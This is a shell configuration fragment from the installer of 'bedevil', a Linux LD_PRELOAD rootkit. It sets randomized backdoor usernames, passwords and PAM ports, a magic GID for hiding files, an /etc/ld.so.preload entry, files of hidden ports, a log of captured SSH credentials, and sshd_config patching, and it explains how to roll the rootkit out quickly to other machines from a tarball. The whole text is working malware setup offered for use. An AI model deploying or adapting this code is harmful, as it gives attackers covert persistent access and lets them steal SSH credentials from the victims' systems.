# default values for settings. (can/will be changed later...)

if [ ! -z $TARBALL ]; then
    # this addition to the rootkit is an effort to decrease the amount of
    # time that it can potentially take to deploy bedevil. configure it once
    # on your host box, and use the same tarball on other machines to deploy
    # bedevil at a much greater speed than usual. (wget, curl, scp, ...)
    if [ -f $TARBALL ] && [[ $TARBALL == *".tar.gz" ]]; then
        [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
        secho "Have $TARBALL, beginning extraction"
        tar xpfz $TARBALL && \
            secho "Finished extraction successfully" || \
            { eecho "Failure extracting" && exit; }
        NEW_MDIR="`tar -tzf $TARBALL | head -1 | cut -f1 -d"/"`"
        necho "Reading settings from $NEW_MDIR/settings"
        read_defaults $NEW_MDIR/settings
    else
        eecho "No tarball found. ($TARBALL)"
        exit
    fi
fi

# change any of these at runtime.

[ -z $DIRDEPTH ] && DIRDEPTH=1

[ -z $BD_UNAME ] && BD_UNAME=`random 'a-z' 5`
[ -z $BD_PWD ] && BD_PWD=`random 'a-zA-Z0-9' 8`
[ -z $PAM_PORT ] && PAM_PORT=`random '1-9' 4`

[ -z $MAGIC_GID ] && MAGIC_GID=`random '1-5' 5`               # default GID used to hide things.
[ -z $GID_PATH ] && GID_PATH="`random_path $DIRDEPTH`"        # file the rootkit reads for the magic GID.
[ -z $BD_VAR ] && BD_VAR="`random 'A-Z' 9`"                   # environment variable to grant rk perms.

[ -z $INSTALL_DIR ] && INSTALL_DIR="`random_path $DIRDEPTH`"  # installation directory.
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload"     # preload file location.
[ -z $BDVLSO ] && BDVLSO="lib`basename $INSTALL_DIR`.so"      # name of rootkit shared object.
[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$BDVLSO.\$PLATFORM"    # where the rootkit lives.

[ -z $HIDEPORTS ] && HIDEPORTS="`random_path $DIRDEPTH`"        # file to read hidden ports from.
[ -z $SSH_LOGS ] && SSH_LOGS="`random_path $DIRDEPTH`"          # ssh credentials log file.
[ -z $INTEREST_DIR ] && INTEREST_DIR="`random_path $DIRDEPTH`"  # where interesting files live.
[ -z $SSHD_CONFIG ] && SSHD_CONFIG="/etc/ssh/sshd_config"       # for use with PATCH_SSHD_CONFIG.

[ -z $MDIR ] && MDIR="inc"                        # default include directory...
[ -z $NEW_MDIR ] && NEW_MDIR="${BDVLSO}.${MDIR}"  # new include directory...

[ -z $BDVL_H ] && BDVL_H="$NEW_MDIR/bedevil.h"  # location of header to write to.
[ -z $PLATFORM ] && PLATFORM="`uname -m`"       # machine's platform identifier.

# files to copy to install dir upon configuration de la maison
declare -a array COPY_FILES=(etc/.rolf etc/.bashrc)
